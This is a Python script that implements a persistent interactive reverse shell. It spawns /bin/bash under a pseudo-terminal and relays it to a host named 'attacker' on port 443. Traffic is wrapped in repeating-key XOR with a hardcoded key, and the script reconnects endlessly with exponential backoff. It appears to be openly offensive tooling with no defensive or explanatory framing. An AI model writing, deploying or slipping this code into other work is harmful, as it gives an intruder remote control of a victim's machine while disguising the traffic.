import fcntl
import itertools
import os
import pty
import select
import signal
import socket
import struct
import termios
import time

KEY = b"my_secret_key"
HOST = "attacker"
PORT = 443
FRAME_DATA = b"D"
FRAME_RESIZE = b"R"
HEADER = struct.Struct("!cI")
MAX_DATA_FRAME = 4096


def new_keystream():
    return itertools.cycle(KEY)


def xor_crypt(keystream, data):
    return bytes([a ^ b for a, b in zip(data, keystream)])


def validate_frame(kind, length):
    if (kind == FRAME_DATA and length <= MAX_DATA_FRAME) or (kind == FRAME_RESIZE and length == 4):
        return
    raise ValueError("invalid frame")


def write_all(fd, data):
    view = memoryview(data)
    while view:
        written = os.write(fd, view)
        view = view[written:]


def send_frame(sock, keystream, kind, payload):
    frame = HEADER.pack(kind, len(payload)) + payload
    sock.sendall(xor_crypt(keystream, frame))


def set_winsize(fd, rows, cols):
    fcntl.ioctl(fd, termios.TIOCSWINSZ, struct.pack("HHHH", rows, cols, 0, 0))


def handle_frame(fd, kind, payload):
    if kind == FRAME_RESIZE and len(payload) == 4:
        rows, cols = struct.unpack("!HH", payload)
        set_winsize(fd, rows, cols)
    elif kind == FRAME_DATA:
        write_all(fd, payload)


def relay(sock):
    pid, fd = pty.fork()
    if pid == 0:
        try:
            os.execv("/bin/bash", ["/bin/bash", "-i"])
        finally:
            os._exit(1)

    set_winsize(fd, 24, 80)
    send_stream = new_keystream()
    recv_stream = new_keystream()
    buffer = b""
    sock_open = True
    try:
        while True:
            watch = [fd] + ([sock] if sock_open else [])
            readable, _, _ = select.select(watch, [], [])
            if fd in readable:
                try:
                    data = os.read(fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                send_frame(sock, send_stream, FRAME_DATA, data)
            if sock_open and sock in readable:
                chunk = sock.recv(4096)
                if not chunk:
                    sock_open = False
                    write_all(fd, b"\x04")
                    continue
                buffer += xor_crypt(recv_stream, chunk)
                while len(buffer) >= HEADER.size:
                    kind, length = HEADER.unpack_from(buffer)
                    validate_frame(kind, length)
                    end = HEADER.size + length
                    if len(buffer) < end:
                        break
                    payload = buffer[HEADER.size:end]
                    buffer = buffer[end:]
                    handle_frame(fd, kind, payload)
    finally:
        os.close(fd)
        try:
            os.kill(pid, signal.SIGHUP)
        except ProcessLookupError:
            pass
        try:
            os.waitpid(pid, 0)
        except ChildProcessError:
            pass


wait = 5
while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
        relay(s)
        wait = 5
    except (OSError, ValueError):
        pass
    finally:
        s.close()
    time.sleep(wait)
    wait = min(wait * 2, 600)
